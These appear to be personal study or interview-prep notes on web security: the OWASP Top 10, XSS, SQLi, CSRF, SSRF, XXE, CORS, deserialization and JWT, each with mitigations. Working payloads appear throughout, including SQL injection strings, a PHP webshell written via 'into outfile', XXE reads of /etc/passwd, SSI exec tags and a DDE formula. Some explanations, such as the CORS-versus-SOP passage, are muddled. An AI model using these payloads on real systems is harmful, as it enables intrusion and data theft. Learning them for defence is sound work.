100 technice to bypass login page
	Credential Harvesting (Phishing):
	Cross-Site Scripting (XSS):
	Cross-Site Request Forgery (CSRF):
	Brute Force Attacks: 
	User Enumeration:
	Denial of Service (DoS): 
	Server-Side Vulnerabilities: 
	Information Leakage
	Session Fixation
	Man-in-the-Middle (MitM) Attacks
	Clickjacking
	Session Prediction
	Form Tampering
	Session Hijacking
	Host Header Manipulation
	CORS



what is owasp top 10?
The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.

The OWASP Top 10 was first released in 2003

=======================
OWASP TOP 10
=======================
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10.Server-Side Request Forgery


==============================
RCE payload - 
===============================
Remote code execution (RCE) is when an attacker accesses a target computing device and makes changes remotely.

Impact:
	malware execution to an attacker gaining full control over a compromised machine

    ;netstat -a;
    ;system('cat%20/etc/passwd')

=================================
SSI - 
================================
    SSI (Server-side Include) injection is a server-side exploit that enables an attacker to inject code into a web application/server and execute it upon the next page load, locally, by the webserver.
    <!--#exec cmd="ls -a"-->
    <!--#exec cmd="whoami"-->

========================
XSS			https://portswigger.net/web-security/cross-site-scripting
========================
	Cross-Site Scripting, is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious scripts into trusted websites viewed by other users.
	
Reflected
	In this type of attack, the injected script is embedded in a URL or input field, which is then reflected back to the victim by the server. When the victim clicks on a specially crafted link or submits a form, the script gets executed in their browser.

Stored
	Also known as persistent XSS, this occurs when the injected malicious script is permanently stored on the target server. Whenever a user accesses the affected page, the script is served and executed, potentially impacting multiple users.

DOM
	This type of XSS attack exploits vulnerabilities in the Document Object Model (DOM) of a web page. The attacker manipulates the DOM environment to execute malicious scripts in the victim's browser
	
	http://www.example.com/userdashboard.html#context=<script>SomeFunction(somevariable)</script>.
	<script>SomeFunction(somevariable)</script>

	Prevent
		always use it in the text context, never as HTML tags or any other potential code.
		Avoid methods such as document.innerHTML,document.innerText and document.textContent.

DOM & Reflected -
	Reflected XSS aims to embed client-side data to the server-side code in HTML documents, 
	while in DOM-based XSS, the malicious payloads are executed on the client-side (browser) environment. 
	
	Reflected XSS can only target dynamic web pages, 
	while DOM-based XSS targets static and dynamic web pages
	

Impact
	In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.

Mitigation
	Filter input on arrival
	Encode data on output
	Use appropriate response headers.
	Content Security Policy
	HTTPOnly flag


Xss and its types, mitigation, what most you can do by XSS.
	The severity of a Cross-Site Scripting (XSS) vulnerability on a login page can vary depending on the context and impact of the vulnerability. However, XSS vulnerabilities on login pages are generally considered high-severity due to the following reasons:

	Credential theft
	Account takeover
	Impact on multiple users
	Attack escalation
	Reputation and trust damage

	what most you can do by XSS:----
		Cookie theft and session hijacking
		Phishing attacks


XSS on LOGIN page severity and why.

	The severity of a Cross-Site Scripting (XSS) vulnerability on a login page is generally considered high

	Authentication bypass: An XSS vulnerability on a login page can be exploited to bypass authentication mechanisms.

	Credential theft: By injecting malicious scripts into the login page, attackers can capture login credentials entered by users. 

	Privilege escalation: If the XSS vulnerability allows for session manipulation or access to user session cookies, attackers can hijack authenticated sessions.

	Phishing attacks: XSS vulnerabilities on login pages can be exploited to create realistic-looking phishing pages. 

	Impact on user trust: XSS attacks on login pages can significantly impact user trust and confidence in the affected application. Successful exploitation can lead to unauthorized access, data breaches, or account compromise.


=================================
SQLi- 
================================
https://www.acunetix.com/websitesecurity/sql-injection2/#:~:text=SQL%20Injection%20can%20be%20classified,Out%2Dof%2Dband%20SQLi.

SQL injection is a code injection technique that might destroy your database.

    Error based
	 	-  	' OR 1=1

    union based - 
        ' order by 5 --+
        ' UNION ALL SELECT 1,2,3,4 and so on --+ 
        ' UNION ALL SELECT 1,database(),table_name,4 from information_schema.tables --+
        ' UNION ALL SELECT 1,group_concat(column_name),3,4 from information_schema.columns where table_name='?' --+
        ' UNION ALL SELECT 1,group_concat(col1,col2),3,4 from table_name --+

    Auth bypass - 	' or 'x'='xcaca
	Blind Boolean :
		' or 1=1 and substring(database(),1,1)='b'#
	Blind Time :
		' or sleep(5)#,		' or 1=1 and sleep(5)#
		'; IF (1=2) WAITFOR DELAY '0:0:10'--
		'; IF (1=1) WAITFOR DELAY '0:0:10'--
		'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
	Sqlite:
		select sql from sqlite_master tbl_name='user'

No SQL Payload
	Error Based - '"\/$[].>
	Boolean Injection - {"$ne": -1}
	Timing Based - ;sleep(100);


Mitigation
	Use of Prepared Statements (with Parameterized Queries)
	Use whitelists, not blacklists
	Adopt the latest technologies
	Employ verified mechanisms
	Scan regularly


Example of parameterized query.

	Parameterized SQL queries allow you to place parameters in an SQL query instead of a constant value. A parameter takes a value only when the query is executed, which allows the query to be reused with different values and for different purposes

	SELECT* FROM ihtags WHERE collectorname=? ORDER BY tagname


perform RCE using SQL injection

        " union select null, "<?php echo shell_exec($_GET['cmd']) ?>", null into outfile "/var/www/html/shell.php" -- #


What is the root cause of SQL injection.

        The root cause of SQL injection is the failure to properly validate and sanitize
        Improper input validation
        Concatenation of user input in SQL queries
        Lack of parameterized queries or prepared statements
        Insufficient user authorization and access controls

First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.

Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way.


================================
CSRF
===============================
	Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.

	Mitigate:
	Anti csrf token : Generate and include unique CSRF tokens in each HTML form or API request. These tokens are typically stored in server-side sessions or included as hidden fields in forms.

	Random & Unique: Token Should be random and unique everytime
	
	SameSite attribute: SameSite attribute for cookies to restrict their usage to same-site requests. By setting the SameSite attribute to "Strict" or "Lax" in the response headers, you can prevent the browser from sending cookies in cross-site requests.

	SameSite=Strict: Cookies are only sent in a first-party context (i.e., the site the user is currently visiting).
	SameSite=Lax: Cookies are sent with top-level navigation and when making GET requests from third-party websites (e.g., links).
	SameSite=None: Cookies are sent with all cross-origin requests.

	Put the LAX restriction to defence in depth some time anti csrf token is not good enough.

	Anti-CSRF frameworks : These frameworks often automate the generation and validation of CSRF tokens, reducing the implementation complexity and ensuring consistent protection. Examples include Django's CSRF protection or OWASP CSRFGuard.

	Custom headers: "X-Requested-With" or "X-CSRF-Token," in your HTTP requests. 

	Cookie-to-header tokenization: Store the CSRF token in an HTTP-only cookie and include it as a custom header in each request.

	Double-submit cookie pattern: In this approach, the CSRF token is stored both as a cookie and as a form parameter. 

	Referer header checking: Validate the Referer header of incoming requests to ensure they originate from the expected domain.


is it safe to implement CSRF token is in COOKIE.

	CSRF tokens prevent CSRF. because without a token, an attacker cannot create valid requests to the backend server. For the Synchronised Token Pattern, CSRF tokens should not be transmitted using cookies. The CSRF token can be transmitted to the client as part of a response payload, such as a HTML or JSON response.

	X-custom-header : ABC

IDOR vs CSRF


	Exploitation Method: IDOR involves directly manipulating identifiers . CSRF works on authenticated users into unknowingly performing actions on the target application.

	Target of the Attack: IDOR targets specific objects or resources within the application. CSRF targets the actions performed by authenticated users.

	Scope of Impact: IDOR vulnerabilities typically affect individual objects or resources. CSRF attacks can be impacting any action that the targeted user is authorized to perform within the application.

	Authentication Requirement: IDOR vulnerabilities can be exploited by both authenticated and unauthenticated attackers. CSRF attacks require the victim to be authenticated in the target application for the attack to succeed.
	
======================================
IDOR & Access Controll
======================================

IDOR vs Access Controll

	Direct object reference vulnerabilities allow the hacker to gain access authority to restricted resources by guessing their ID value. On the other hand, missing function level authorization is an authorization flaw where the application fails to check for user permissions properly. 

prevent :
	Never rely on obfuscation alone for access control.
	Unless a resource is intended to be publicly accessible, deny access by default.
	use a single application-wide mechanism for enforcing access controls.

=======================================
SSRF
=====================================
	https://portswigger.net/web-security/ssrf
-----------------------
What is SSRF?
----------------------
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.-*

	Input validation and whitelisting
	Restrict network access
	Implement a strong security configuration
	Secure server-side code:
	Use safe API endpoints
	Least privilege principle
	Security patches and updates


Difference between SSRF and CSRF
	A CSRF attack targets the user to execute malicious requests on behalf of the attacker. wher attacker can execute the code to perform their action. On the other hand, an 
	SSRF attack primarily targets the backend server to read or update internal resources from an external network.


==========================
XXE :
=========================
	https://portswigger.net/web-security/xxe
	
	vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems.

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<stockCheck><productId>&xxe;</productId></stockCheck>

	Exploiting XXE to retrieve files
	Exploiting XXE to perform SSRF attacks
	Exploiting blind XXE exfiltrate data out-of-band
	Exploiting blind XXE to retrieve data via error messages

Prevent:
	Manually disable DTDs(Document Type Definitions)
	Instrument your application server
	Harden configuration against XXE

-----------------------------------------
Is it possible to perform XXE on Json request.
-----------------------------------------
	Yes
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

=========================
File Upload
========================
	<?php echo system($_GET['command']); ?>
	GET /example/exploit.php?command=id HTTP/1.1

what all things you will test on file upload fuctionality.

	File Size Limit
	File Type Validation
	File Content Validation
	Path Traversal Attacks
	Malicious File Testing
	File Overwriting
	Server-Side File Handling
	Error Handling
	Performance and Scalability
	Access Controls

How will you bypass file extension validation.
	shell.php.jpg
	shell.php%00.jpg, 	shell.php\x00.jpg


What is CSV injection it's impact and mitigation.

	DDE ("cmd";"/C calc";"!A0")A0

	Impact 	: 	Remote Code Execution, Data Leakage 

	Mitigation : 
		Input Validation and Sanitization
		Special Character Escaping
		Content-Type
		Limited Cell Formulas

==========================
CORS
========================
	https://portswigger.net/web-security/cors
	
	Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain

	Impact : retrieving user setting information or saved payment card

	Request :
	Origin : attacker.com

	1st CAse:
		Response:
		Access-Controll-allow-origin: attacker.com
		Access-Controll-allow-credential:true
	
	2nd CAse:
		Response:
		Access-Controll-allow-origin: null
		Access-Controll-allow-credential:true
	
	3rd Case:
		Response:
		Access-Controll-allow-origin: *
		Access-Controll-allow-credential:true

	
	Proper configuration of cross-origin requests on header Access-Control-Allow-Origin 
	Only allow trusted sites
	Avoid whitelisting null (Access-Control-Allow-Origin: null)


==================================
insecure deserialization? 		https://portswigger.net/web-security/deserialization
==================================
	When attacker try to manipulate serialized objects in order to pass harmful data into the application code.

	O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

Impact:
	The impact of insecure deserialization can be very severe because it provides an entry point to a massively increased attack surface. It allows an attacker to reuse existing application code in harmful ways, resulting in numerous other vulnerabilities, often remote code execution.

	Even in cases where remote code execution is not possible, insecure deserialization can lead to privilege escalation, arbitrary file access, and denial-of-service attacks.

Prevent
    Do Not Accept Serialized Objects from Untrusted Sources
    Run the Deserialization Code with Limited Access Permissions
    Validate User Input
    Prevent Deserialization of Domain Objects

--------------------------------------------
Java deserialization impqct and mitigation.
--------------------------------------------
	Java deserialization is a process where serialized Java objects are converted back into their original form.

	Impact : The primary vulnerability arises when an attacker can control the serialized data being deserialized, allowing them to execute arbitrary code within the context of the deserialization process.

	mitigate:
	1	Input validation and whitelisting
	2	Secure deserialization frameworks
	3	Avoid insecure deserialization
	4	Use safe default configurations
	5	Code review and testing
	6	Apply patches and updates
	7	Least privilege principle


==================================
Directory Traversal attack
==================================
	is a vulnerability that allows an attacker to access files and directories outside of the intended directory structure. 
	../../../etc/passwd

Mitigate
	The application should validate the user input before processing it. 
	

------------------------------------------
difference between Path Traversal and LFI
------------------------------------------
Path/Directory Traversal vulnerabilities only allow an attacker to read a file, while LFI and RFI may also allow an attacker to execute code.

============================================
		LFI & RFI
============================================

	Local File Inclusion (LFI):
	Local File Inclusion (LFI) is a vulnerability that allows an attacker to include local files on the web server into the application's output

	Remote File Inclusion (RFI):
	Remote File Inclusion (RFI) is a vulnerability that allows an attacker to include files from remote servers into a web application.

==================================
How does OAuth 2.0 work?
==================================
	OAuth 2.0 was originally developed as a way of sharing access to specific data between applications. It works by defining a series of interactions between three distinct parties, namely a client application, a resource owner, and the OAuth service provider.

    Client application
    Resource owner
    OAuth service provider

=============================
CLRF injection.
=============================
	CRLF injection is a software application coding vulnerability that occurs when an attacker injects a CRLF character sequence where it is not expected. When CRLF injection is used to split an HTTP response header, it is referred to as HTTP Response Splitting.

	%0D%0A
	/%0d%0aLocation:%20http://myweb.com

====================================
HTTP Request smuggling?
====================================
https://portswigger.net/web-security/request-smuggling



==================================
HTTP Host header attacks
==================================
https://portswigger.net/web-security/host-header
	Password reset poisoning LABS
	Web cache poisoning LABS
	Exploiting classic server-side vulnerabilities
	Bypassing authentication LABS
	Virtual host brute-forcing
	Routing-based SSRF LABS
	Connection state attacks LABS

Prevent
    Protect absolute URLs
    Validate the Host header
    Don't support Host override headers
    Whitelist permitted domains
    Be careful with internal-only virtual hosts


========================================
HTTP COOKIE flags and its significance.
=======================================
	HTTP cookie flags are attributes that can be set when a cookie is created or modified.

	Secure flag: When the Secure flag is set, the cookie is only transmitted over secure HTTPS connections.

	HttpOnly flag: The HttpOnly flag restricts access to cookies from client-side JavaScript code.

	SameSite flag: The SameSite flag specifies how cookies should be handled when making cross-site requests.

	Max-Age and Expires flags: The Max-Age flag specifies the maximum duration, in seconds, for which the cookie is valid. The Expires flag sets an exact expiration date and time for the cookie. 
	
==============================
TEMPLATE INJECTION	
=============================
Template injection occurs when user input is able to define template expressions. It's commonly classified into two types. These are known as Client side template injection and Server side template injection

Server Side 
    a threat actor exploits a template's native syntax and injects malicious payloads into the template. The compromised template is then executed server-side. A template engine generates a web page by combining a fixed template with volatile data.

	https://portswigger.net/web-security/server-side-template-injection

Client Side
    a vulnerability similar to cross site scripting that allows an attacker to send malicious code (usually in the form of JavaScript) to another user. The injected code is executed by the client side templating and allows the attacker to take control of the victim's browser.


==================================
JWT Attack
==================================
https://portswigger.net/web-security/jwt

Impact
	The impact of JWT attacks is usually severe. If an attacker is able to create their own valid tokens with arbitrary values, they may be able to escalate their own privileges or impersonate other users, taking full control of their accounts.

Posibility:
	Brute Force Attacks:
	Key Exfiltration Attacks:
	Token Manipulation:
	Algorithm Substitution Attacks
	Invalid Token Detection: 

Vulnerabilities arrice:---
	Insecure Cryptographic Algorithms
	Lack of Encryption
	Token Expiration
	Insecure Storage
	Token Leakage
	Insufficient Validation and Authorization

mitigate:---
	Use strong cryptographic algorithms and key lengths
	Implement secure token storage mechanisms on the client-side, such as secure HTTP-only cookies.
	Enforce proper token expiration and implement token revocation mechanisms.
	Validate and authorize the claims and role.
	Transmit JWTs over secure channels (e.g., HTTPS)
	Regularly update and patch libraries and frameworks


========================================
GET and POST method. 
========================================
	GET requests are used to retrieve data from a server. The data is sent in the URL of the request. GET requests are typically used to view web pages, search for information.

	POST requests are used to send data to a server. The data is sent in the body of the request. POST requests are typically used to create or update data on a server, such as submitting a form, registering for an account, or uploading a file.

=========================================
Is it safe to send data in GET method.
=========================================
	GET method can have security implications, and whether it is safe or not depends on the specific context and nature of the data being transmitted. 
		Here are some considerations: 
		Data exposure
		URL length limitations
		Caching and prefetching
		Request logging
		

==========================================
Oauth token and its vulnerabilities.
==========================================
	when the configuration of the OAuth service itself enables attackers to steal authorization codes or access tokens associated with other users' accounts. 

===========================================
How to perform CSRF attack on JSON based application

	Usually, JSON is CSRF-safe, but only when requests with content-type other than application/json gets rejected or additional CSRF protection is in place (Authorization headers/API keys). In another case, JSON CSRF can be achieved using the form with text/plain content-type, and well-formatted JSON request
---------------

what is the deference between cors and sop
	CORS is more free and functional than SOP. CORS is not a safety feature compared to SOP. CORS is a method that allows HTTP requests while SOP is sharing resources between different websites, but prevents HTTP response information from reading. As a result, we agree that SOP rules are more stringent than CORS!

---------------------------------
How to perform DOM xss attack and how to mitigate via code level and where you perform dom xss.

